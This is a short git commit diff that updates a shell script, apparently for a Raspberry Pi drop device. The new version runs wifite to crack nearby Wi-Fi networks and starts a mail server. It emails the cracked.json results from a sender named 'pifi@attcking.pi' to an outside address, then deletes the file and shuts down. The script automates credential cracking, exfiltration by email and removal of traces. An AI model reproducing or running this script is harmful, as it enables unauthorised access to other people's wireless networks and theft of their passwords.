96018c2a7658cb4ad0b0725d90c316ed08030e81
Hariss Ali Gills <harissgills@gmail.com>
2022-01-21 22:28:19 +0000

    updated script

--- script.sh
+++ script.sh
@@ -1,6 +1,8 @@
 #!/bin/sh
-sleep 1m
-`sudo wifite --kill | tee output.txt`
-sleep 1m
-'xdotool key ctrl+c'
-'xdotool key Enter'
+sleep 30s
+wifite -p 60 --kill
+systemctl start postfix
+sendEmail -f pifi@attcking.pi -t username@email.com -u "Pa$$W0RD$" -a cracked.json
+systemctl stop postfix
+rm cracked.json
+shutdown now
